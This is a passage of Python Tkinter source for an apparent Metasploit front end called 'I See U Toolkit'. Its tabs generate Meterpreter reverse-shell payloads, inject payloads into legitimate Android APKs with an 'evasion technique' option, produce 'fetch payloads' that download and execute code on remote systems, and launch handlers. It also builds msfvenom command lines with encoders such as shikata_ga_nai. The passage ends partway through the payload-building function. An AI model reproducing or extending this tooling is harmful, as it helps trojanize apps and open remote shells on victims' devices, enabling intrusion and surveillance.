        ttk.Label(encoding_frame, text="Iterations:").pack(anchor=tk.W)
        self.iterations_var = tk.IntVar(value=1)
        ttk.Spinbox(encoding_frame, from_=1, to=5, textvariable=self.iterations_var).pack(fill=tk.X, pady=2)
        
        # Action buttons
        action_frame = ttk.Frame(trad_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Generate Payload", 
                  command=self.generate_traditional_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Start Handler", 
                  command=self.start_handler_from_tab).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="View Command", 
                  command=self.view_command).pack(side=tk.LEFT, padx=5)
    
    def create_android_injection_tab(self):
        """Create the Android payload injection tab."""
        android_tab = ttk.Frame(self.notebook)
        self.notebook.add(android_tab, text="Android Injection")
        
        # Header
        header_label = ttk.Label(android_tab, text="Inject Payload into Original APK", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Main frame
        main_frame = ttk.Frame(android_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left frame for options
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Connection settings
        conn_settings_frame = ttk.LabelFrame(left_frame, text="Connection Settings", padding=10)
        conn_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_settings_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.android_lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.android_lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.android_lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(conn_settings_frame, textvariable=self.android_lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Payload Name:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.android_payload_name_var = tk.StringVar(value="android_payload")
        ttk.Entry(conn_settings_frame, textvariable=self.android_payload_name_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        conn_settings_frame.columnconfigure(1, weight=1)
        
        # APK selection
        apk_frame = ttk.LabelFrame(left_frame, text="APK Selection", padding=10)
        apk_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(apk_frame, text="Original APK:").pack(anchor=tk.W)
        self.original_apk_var = tk.StringVar()
        apk_entry_frame = ttk.Frame(apk_frame)
        apk_entry_frame.pack(fill=tk.X, pady=2)
        ttk.Entry(apk_entry_frame, textvariable=self.original_apk_var).pack(side=tk.LEFT, fill=tk.X, expand=True)
        ttk.Button(apk_entry_frame, text="Browse...", 
                  command=self.browse_apk).pack(side=tk.RIGHT, padx=5)
        
        # Permissions
        perm_frame = ttk.LabelFrame(left_frame, text="Permissions", padding=10)
        perm_frame.pack(fill=tk.BOTH, expand=True, pady=5)
        
        self.android_permissions = {}
        for perm_group, perms in self.toolkit.android_configs["permissions"].items():
            self.android_permissions[perm_group] = tk.BooleanVar(value=False)
            ttk.Checkbutton(perm_frame, text=perm_group.title(), 
                           variable=self.android_permissions[perm_group]).pack(anchor=tk.W)
        
        # Right frame for additional options
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Android settings
        android_settings_frame = ttk.LabelFrame(right_frame, text="Android Settings", padding=10)
        android_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(android_settings_frame, text="Target SDK:").pack(anchor=tk.W)
        self.target_sdk_var = tk.StringVar(value="android_11")
        sdk_combo = ttk.Combobox(android_settings_frame, textvariable=self.target_sdk_var, 
                                values=list(self.toolkit.android_configs["target_sdk_versions"].keys()))
        sdk_combo.pack(fill=tk.X, pady=2)
        
        ttk.Label(android_settings_frame, text="Evasion Technique:").pack(anchor=tk.W)
        self.evasion_var = tk.StringVar(value="apk_wrapper")
        evasion_combo = ttk.Combobox(android_settings_frame, textvariable=self.evasion_var, 
                                    values=self.toolkit.android_configs["evasion_techniques"])
        evasion_combo.pack(fill=tk.X, pady=2)
        
        # Keystore settings
        keystore_frame = ttk.LabelFrame(right_frame, text="Keystore Settings", padding=10)
        keystore_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(keystore_frame, text="Keystore Path:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.keystore_path_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore"))
        ttk.Entry(keystore_frame, textvariable=self.keystore_path_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Keystore Password:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.keystore_pass_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"))
        ttk.Entry(keystore_frame, textvariable=self.keystore_pass_var, show="*").grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Key Alias:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.key_alias_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"))
        ttk.Entry(keystore_frame, textvariable=self.key_alias_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Key Password:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.key_pass_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("key_password", "android"))
        ttk.Entry(keystore_frame, textvariable=self.key_pass_var, show="*").grid(row=3, column=1, sticky=tk.EW, pady=2)
        
        keystore_frame.columnconfigure(1, weight=1)
        
        # Action buttons
        action_frame = ttk.Frame(android_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Inject Payload", 
                  command=self.inject_android_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Start Handler", 
                  command=self.start_android_handler).pack(side=tk.LEFT, padx=5)
    
    def create_fetch_payload_tab(self):
        """Create the fetch payload generation tab."""
        fetch_tab = ttk.Frame(self.notebook)
        self.notebook.add(fetch_tab, text="Fetch Payload")
        
        # Header
        header_label = ttk.Label(fetch_tab, text="Generate Fetch Payload", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Info text
        info_text = tk.Text(fetch_tab, height=4, wrap=tk.WORD, bg="#f0f0f0", fg="#333333", 
                           font=('Arial', 10), relief=tk.FLAT)
        info_text.pack(fill=tk.X, padx=10, pady=5)
        info_text.insert(tk.END, """
Fetch payloads generate commands that can be executed on remote systems
to download and execute payloads automatically. They support HTTP, HTTPS,
and TFTP protocols.
        """)
        info_text.config(state=tk.DISABLED)
        
        # Main frame
        main_frame = ttk.Frame(fetch_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left frame for options
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Platform selection
        platform_frame = ttk.LabelFrame(left_frame, text="Target Platform", padding=10)
        platform_frame.pack(fill=tk.X, pady=5)
        
        self.fetch_platform_var = tk.StringVar(value="windows")
        ttk.Radiobutton(platform_frame, text="Windows", variable=self.fetch_platform_var, 
                       value="windows").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Linux", variable=self.fetch_platform_var, 
                       value="linux").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Android", variable=self.fetch_platform_var, 
                       value="android").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="macOS", variable=self.fetch_platform_var, 
                       value="macos").pack(anchor=tk.W)
        
        # Protocol selection
        protocol_frame = ttk.LabelFrame(left_frame, text="Fetch Protocol", padding=10)
        protocol_frame.pack(fill=tk.X, pady=5)
        
        self.fetch_protocol_var = tk.StringVar(value="http")
        ttk.Radiobutton(protocol_frame, text="HTTP", variable=self.fetch_protocol_var, 
                       value="http").pack(anchor=tk.W)
        ttk.Radiobutton(protocol_frame, text="HTTPS", variable=self.fetch_protocol_var, 
                       value="https").pack(anchor=tk.W)
        
        # Right frame for connection settings
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Connection settings
        conn_settings_frame = ttk.LabelFrame(right_frame, text="Connection Settings", padding=10)
        conn_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_settings_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.fetch_lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.fetch_lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.fetch_lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(conn_settings_frame, textvariable=self.fetch_lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Fetch Server Host:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.fetch_srvhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.fetch_srvhost_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Fetch Server Port:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.fetch_srvport_var = tk.StringVar(value="8080")
        ttk.Entry(conn_settings_frame, textvariable=self.fetch_srvport_var).grid(row=3, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Payload Name:").grid(row=4, column=0, sticky=tk.W, pady=2)
        self.fetch_payload_name_var = tk.StringVar(value="fetch_payload")
        ttk.Entry(conn_settings_frame, textvariable=self.fetch_payload_name_var).grid(row=4, column=1, sticky=tk.EW, pady=2)
        
        conn_settings_frame.columnconfigure(1, weight=1)
        
        # Action buttons
        action_frame = ttk.Frame(fetch_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Generate Fetch Payload", 
                  command=self.generate_fetch_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Start Handler", 
                  command=self.start_fetch_handler).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="View Command", 
                  command=self.view_fetch_command).pack(side=tk.LEFT, padx=5)
    
    def create_multi_format_tab(self):
        """Create the multi-format payload generation tab."""
        multi_tab = ttk.Frame(self.notebook)
        self.notebook.add(multi_tab, text="Multi-Format")
        
        # Header
        header_label = ttk.Label(multi_tab, text="Generate Multi-Format Payload", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Info text
        info_text = tk.Text(multi_tab, height=4, wrap=tk.WORD, bg="#f0f0f0", fg="#333333", 
                           font=('Arial', 10), relief=tk.FLAT)
        info_text.pack(fill=tk.X, padx=10, pady=5)
        info_text.insert(tk.END, """
Generate the same payload in multiple formats for compatibility testing.
This will create multiple files with different extensions in the output directory.
        """)
        info_text.config(state=tk.DISABLED)
        
        # Main frame
        main_frame = ttk.Frame(multi_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Left frame for options
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Platform selection
        platform_frame = ttk.LabelFrame(left_frame, text="Target Platform", padding=10)
        platform_frame.pack(fill=tk.X, pady=5)
        
        self.multi_platform_var = tk.StringVar(value="windows")
        ttk.Radiobutton(platform_frame, text="Windows", variable=self.multi_platform_var, 
                       value="windows").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Linux", variable=self.multi_platform_var, 
                       value="linux").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="Android", variable=self.multi_platform_var, 
                       value="android").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="macOS", variable=self.multi_platform_var, 
                       value="macos").pack(anchor=tk.W)
        ttk.Radiobutton(platform_frame, text="iOS", variable=self.multi_platform_var, 
                       value="ios").pack(anchor=tk.W)
        
        # Payload type
        payload_frame = ttk.LabelFrame(left_frame, text="Payload Type", padding=10)
        payload_frame.pack(fill=tk.X, pady=5)
        
        self.multi_payload_type_var = tk.StringVar(value="meterpreter")
        ttk.Radiobutton(payload_frame, text="Meterpreter", variable=self.multi_payload_type_var, 
                       value="meterpreter").pack(anchor=tk.W)
        ttk.Radiobutton(payload_frame, text="Shell", variable=self.multi_payload_type_var, 
                       value="shell").pack(anchor=tk.W)
        
        # Connection method
        conn_frame = ttk.LabelFrame(left_frame, text="Connection Method", padding=10)
        conn_frame.pack(fill=tk.X, pady=5)
        
        self.multi_conn_method_var = tk.StringVar(value="reverse_tcp")
        ttk.Radiobutton(conn_frame, text="Reverse TCP", variable=self.multi_conn_method_var, 
                       value="reverse_tcp").pack(anchor=tk.W)
        ttk.Radiobutton(conn_frame, text="Reverse HTTP", variable=self.multi_conn_method_var, 
                       value="reverse_http").pack(anchor=tk.W)
        ttk.Radiobutton(conn_frame, text="Reverse HTTPS", variable=self.multi_conn_method_var, 
                       value="reverse_https").pack(anchor=tk.W)
        
        # Right frame for connection settings
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        # Connection settings
        conn_settings_frame = ttk.LabelFrame(right_frame, text="Connection Settings", padding=10)
        conn_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_settings_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.multi_lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.multi_lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.multi_lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(conn_settings_frame, textvariable=self.multi_lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="Payload Name:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.multi_payload_name_var = tk.StringVar(value="multi_payload")
        ttk.Entry(conn_settings_frame, textvariable=self.multi_payload_name_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        conn_settings_frame.columnconfigure(1, weight=1)
        
        # Encoding options
        encoding_frame = ttk.LabelFrame(right_frame, text="Encoding Options", padding=10)
        encoding_frame.pack(fill=tk.X, pady=5)
        
        self.multi_use_encoding_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(encoding_frame, text="Use Encoding", 
                       variable=self.multi_use_encoding_var).pack(anchor=tk.W)
        
        ttk.Label(encoding_frame, text="Encoder:").pack(anchor=tk.W)
        self.multi_encoder_var = tk.StringVar(value="x86/shikata_ga_nai")
        encoder_combo = ttk.Combobox(encoding_frame, textvariable=self.multi_encoder_var, 
                                    values=self.toolkit.encoders)
        encoder_combo.pack(fill=tk.X, pady=2)
        
        ttk.Label(encoding_frame, text="Iterations:").pack(anchor=tk.W)
        self.multi_iterations_var = tk.IntVar(value=1)
        ttk.Spinbox(encoding_frame, from_=1, to=5, textvariable=self.multi_iterations_var).pack(fill=tk.X, pady=2)
        
        # Action buttons
        action_frame = ttk.Frame(multi_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Generate Multi-Format Payload", 
                  command=self.generate_multi_format_payload).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Start Handler", 
                  command=self.start_multi_handler).pack(side=tk.LEFT, padx=5)
    
    def create_listener_tab(self):
        """Create the listener tab."""
        listener_tab = ttk.Frame(self.notebook)
        self.notebook.add(listener_tab, text="Listener")
        
        # Header
        header_label = ttk.Label(listener_tab, text="Start Meterpreter Listener", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Main frame
        main_frame = ttk.Frame(listener_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Payload selection
        payload_frame = ttk.LabelFrame(main_frame, text="Payload Selection", padding=10)
        payload_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(payload_frame, text="Payload Type:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.listener_payload_var = tk.StringVar(value="windows/x64/meterpreter/reverse_tcp")
        payload_combo = ttk.Combobox(payload_frame, textvariable=self.listener_payload_var, 
                                    values=[
                                        "windows/x64/meterpreter/reverse_tcp",
                                        "linux/x64/meterpreter/reverse_tcp",
                                        "android/meterpreter/reverse_tcp",
                                        "osx/x64/meterpreter/reverse_tcp",
                                        "java/meterpreter/reverse_tcp"
                                    ])
        payload_combo.grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        # Connection settings
        conn_settings_frame = ttk.LabelFrame(main_frame, text="Connection Settings", padding=10)
        conn_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(conn_settings_frame, text="LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.listener_lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(conn_settings_frame, textvariable=self.listener_lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(conn_settings_frame, text="LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.listener_lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(conn_settings_frame, textvariable=self.listener_lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        conn_settings_frame.columnconfigure(1, weight=1)
        
        # Terminal settings
        terminal_frame = ttk.LabelFrame(main_frame, text="Terminal Settings", padding=10)
        terminal_frame.pack(fill=tk.X, pady=5)
        
        self.open_terminal_var = tk.BooleanVar(value=self.toolkit.config.get("open_terminal_for_handler", True))
        ttk.Checkbutton(terminal_frame, text="Open Terminal for Handler", 
                       variable=self.open_terminal_var).pack(anchor=tk.W)
        
        ttk.Label(terminal_frame, text="Terminal Emulator:").pack(anchor=tk.W)
        self.terminal_var = tk.StringVar(value=self.toolkit.config.get("terminal_emulator", "auto"))
        terminal_combo = ttk.Combobox(terminal_frame, textvariable=self.terminal_var, 
                                      values=["auto"] + self.toolkit.terminal_emulators)
        terminal_combo.pack(fill=tk.X, pady=2)
        
        ttk.Label(terminal_frame, text="Terminal Title:").pack(anchor=tk.W)
        self.terminal_title_var = tk.StringVar(value=self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
        ttk.Entry(terminal_frame, textvariable=self.terminal_title_var).pack(fill=tk.X, pady=2)
        
        # Action buttons
        action_frame = ttk.Frame(listener_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Start Listener", 
                  command=self.start_listener).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Save Settings", 
                  command=self.save_listener_settings).pack(side=tk.LEFT, padx=5)
    
    def create_settings_tab(self):
        """Create the settings tab."""
        settings_tab = ttk.Frame(self.notebook)
        self.notebook.add(settings_tab, text="Settings")
        
        # Header
        header_label = ttk.Label(settings_tab, text="Configure Settings", style="Header.TLabel")
        header_label.pack(padx=10, pady=10)
        
        # Main frame
        main_frame = ttk.Frame(settings_tab)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create notebook for settings categories
        settings_notebook = ttk.Notebook(main_frame)
        settings_notebook.pack(fill=tk.BOTH, expand=True)
        
        # General settings tab
        general_tab = ttk.Frame(settings_notebook)
        settings_notebook.add(general_tab, text="General")
        
        # Default settings
        default_frame = ttk.LabelFrame(general_tab, text="Default Settings", padding=10)
        default_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(default_frame, text="Default LHOST:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.default_lhost_var = tk.StringVar(value=self.toolkit.config.get('default_lhost', '192.168.1.100'))
        ttk.Entry(default_frame, textvariable=self.default_lhost_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(default_frame, text="Default LPORT:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.default_lport_var = tk.StringVar(value=self.toolkit.config.get('default_lport', '4444'))
        ttk.Entry(default_frame, textvariable=self.default_lport_var).grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(default_frame, text="Default Encoder:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.default_encoder_var = tk.StringVar(value=self.toolkit.config.get('default_encoder', 'x86/shikata_ga_nai'))
        encoder_combo = ttk.Combobox(default_frame, textvariable=self.default_encoder_var, 
                                    values=self.toolkit.encoders)
        encoder_combo.grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(default_frame, text="Default Format:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.default_format_var = tk.StringVar(value=self.toolkit.config.get('default_format', 'exe'))
        ttk.Entry(default_frame, textvariable=self.default_format_var).grid(row=3, column=1, sticky=tk.EW, pady=2)
        
        default_frame.columnconfigure(1, weight=1)
        
        # Auto settings
        auto_frame = ttk.LabelFrame(general_tab, text="Auto Settings", padding=10)
        auto_frame.pack(fill=tk.X, pady=5)
        
        self.auto_start_handler_var = tk.BooleanVar(value=self.toolkit.config.get('auto_start_handler', False))
        ttk.Checkbutton(auto_frame, text="Auto-start Handler", 
                       variable=self.auto_start_handler_var).pack(anchor=tk.W)
        
        self.auto_detect_ip_var = tk.BooleanVar(value=self.toolkit.config.get('auto_detect_ip', True))
        ttk.Checkbutton(auto_frame, text="Auto-detect IP", 
                       variable=self.auto_detect_ip_var).pack(anchor=tk.W)
        
        # Terminal settings tab
        terminal_tab = ttk.Frame(settings_notebook)
        settings_notebook.add(terminal_tab, text="Terminal")
        
        # Terminal emulator settings
        term_frame = ttk.LabelFrame(terminal_tab, text="Terminal Emulator Settings", padding=10)
        term_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(term_frame, text="Terminal Emulator:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.term_emulator_var = tk.StringVar(value=self.toolkit.config.get("terminal_emulator", "auto"))
        term_combo = ttk.Combobox(term_frame, textvariable=self.term_emulator_var, 
                                 values=["auto"] + self.toolkit.terminal_emulators)
        term_combo.grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        self.term_open_var = tk.BooleanVar(value=self.toolkit.config.get("open_terminal_for_handler", True))
        ttk.Checkbutton(term_frame, text="Open Terminal for Handler", 
                       variable=self.term_open_var).grid(row=1, column=0, columnspan=2, sticky=tk.W, pady=2)
        
        ttk.Label(term_frame, text="Terminal Title:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.term_title_var = tk.StringVar(value=self.toolkit.config.get("terminal_title", "I See U Toolkit - Metasploit Handler"))
        ttk.Entry(term_frame, textvariable=self.term_title_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        term_frame.columnconfigure(1, weight=1)
        
        # Android settings tab
        android_tab = ttk.Frame(settings_notebook)
        settings_notebook.add(android_tab, text="Android")
        
        # Android settings
        android_settings_frame = ttk.LabelFrame(android_tab, text="Android Settings", padding=10)
        android_settings_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(android_settings_frame, text="Target SDK:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.android_target_sdk_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("target_sdk", "android_11"))
        sdk_combo = ttk.Combobox(android_settings_frame, textvariable=self.android_target_sdk_var, 
                                values=list(self.toolkit.android_configs["target_sdk_versions"].keys()))
        sdk_combo.grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(android_settings_frame, text="Evasion Technique:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.android_evasion_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("evasion_technique", "apk_wrapper"))
        evasion_combo = ttk.Combobox(android_settings_frame, textvariable=self.android_evasion_var, 
                                    values=self.toolkit.android_configs["evasion_techniques"])
        evasion_combo.grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        android_settings_frame.columnconfigure(1, weight=1)
        
        # Keystore settings
        keystore_frame = ttk.LabelFrame(android_tab, text="Keystore Settings", padding=10)
        keystore_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(keystore_frame, text="Keystore Path:").grid(row=0, column=0, sticky=tk.W, pady=2)
        self.android_keystore_path_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("keystore_path", "mykey.keystore"))
        ttk.Entry(keystore_frame, textvariable=self.android_keystore_path_var).grid(row=0, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Keystore Password:").grid(row=1, column=0, sticky=tk.W, pady=2)
        self.android_keystore_pass_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("keystore_password", "android"))
        ttk.Entry(keystore_frame, textvariable=self.android_keystore_pass_var, show="*").grid(row=1, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Key Alias:").grid(row=2, column=0, sticky=tk.W, pady=2)
        self.android_key_alias_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("key_alias", "mykey"))
        ttk.Entry(keystore_frame, textvariable=self.android_key_alias_var).grid(row=2, column=1, sticky=tk.EW, pady=2)
        
        ttk.Label(keystore_frame, text="Key Password:").grid(row=3, column=0, sticky=tk.W, pady=2)
        self.android_key_pass_var = tk.StringVar(value=self.toolkit.config.get("android_settings", {}).get("key_password", "android"))
        ttk.Entry(keystore_frame, textvariable=self.android_key_pass_var, show="*").grid(row=3, column=1, sticky=tk.EW, pady=2)
        
        keystore_frame.columnconfigure(1, weight=1)
        
        # Presets frame
        presets_frame = ttk.LabelFrame(settings_tab, text="Presets", padding=10)
        presets_frame.pack(fill=tk.X, pady=10)
        
        ttk.Button(presets_frame, text="Save Current Configuration", 
                  command=self.save_preset_config).pack(side=tk.LEFT, padx=5)
        ttk.Button(presets_frame, text="Load Preset Configuration", 
                  command=self.load_preset_config).pack(side=tk.LEFT, padx=5)
        
        # Action buttons
        action_frame = ttk.Frame(settings_tab)
        action_frame.pack(fill=tk.X, padx=10, pady=10)
        
        ttk.Button(action_frame, text="Save Settings", 
                  command=self.save_settings).pack(side=tk.LEFT, padx=5)
        ttk.Button(action_frame, text="Reset to Defaults", 
                  command=self.reset_settings).pack(side=tk.LEFT, padx=5)
    
    def create_log_window(self):
        """Create a log window to display output."""
        log_window = tk.Toplevel(self.root)
        log_window.title("I See U Toolkit - Log Output")
        log_window.geometry("800x400")
        
        # Create a scrolled text widget
        if PY3:
            self.log_text = scrolledtext.ScrolledText(log_window, wrap=tk.WORD, width=80, height=20)
        else:
            self.log_text = ScrolledText.ScrolledText(log_window, wrap=tk.WORD, width=80, height=20)
        
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Add a clear button
        clear_button = ttk.Button(log_window, text="Clear Log", command=self.clear_log)
        clear_button.pack(pady=5)
        
        # Hide the window initially
        log_window.withdraw()
    
    def update_status(self, message):
        """Update the status bar."""
        self.status_var.set(message)
        self.log_message(message)
    
    def log_message(self, message):
        """Add a message to the log window."""
        if self.log_text:
            self.log_text.config(state=tk.NORMAL)
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            self.log_text.insert(tk.END, "{} - {}\n".format(timestamp, message))
            self.log_text.see(tk.END)
            self.log_text.config(state=tk.DISABLED)
    
    def clear_log(self):
        """Clear the log window."""
        if self.log_text:
            self.log_text.config(state=tk.NORMAL)
            self.log_text.delete(1.0, tk.END)
            self.log_text.config(state=tk.DISABLED)
    
    def show_log_window(self):
        """Show the log window."""
        if self.log_text:
            self.log_text.master.deiconify()
    
    def update_format_options(self, event=None):
        """Update format options based on platform selection."""
        platform = self.platform_var.get()
        if platform in self.toolkit.payload_configs:
            formats = self.toolkit.payload_configs[platform]["formats"]
            self.format_combo['values'] = formats
            if formats:
                self.format_var.set(formats[0])
    
    def browse_apk(self):
        """Browse for an APK file."""
        filename = filedialog.askopenfilename(
            title="Select APK File",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.original_apk_var.set(filename)
    
    def generate_traditional_payload(self):
        """Generate a traditional payload."""
        try:
            # Get values from GUI
            platform = self.platform_var.get()
            payload_type = self.payload_type_var.get()
            conn_method = self.conn_method_var.get()
            output_format = self.format_var.get()
            lhost = self.lhost_var.get()
            lport = self.lport_var.get()
            payload_name = self.payload_name_var.get()
            
            # Validate inputs
            if not lhost or not lport or not payload_name:
                messagebox.showerror("Input Error", "Please fill in all required fields.")
                return
            
            # Build the msfvenom command
            if platform in self.toolkit.payload_configs:
                if payload_type in self.toolkit.payload_configs[platform]:
                    if "staged" in self.toolkit.payload_configs[platform][payload_type]:
                        if conn_method in self.toolkit.payload_configs[platform][payload_type]["staged"]:
                            payload = self.toolkit.payload_configs[platform][payload_type]["staged"][conn_method]
                        else:
                            messagebox.showerror("Error", "Connection method {} not supported for {} {}".format(conn_method, platform, payload_type))
                            return
                    else:
                        messagebox.showerror("Error", "Payload type {} not supported for {}".format(payload_type, platform))
                        return
                else:
                    messagebox.showerror("Error", "Platform {} not supported".format(platform))
                    return
            
            # Start building the command
            cmd_parts = ["msfvenom", "-p", payload]
            
            # Add LHOST and LPORT
            cmd_parts.extend(["LHOST={}".format(lhost), "LPORT={}".format(lport)])
            
            # Add encoding options if selected
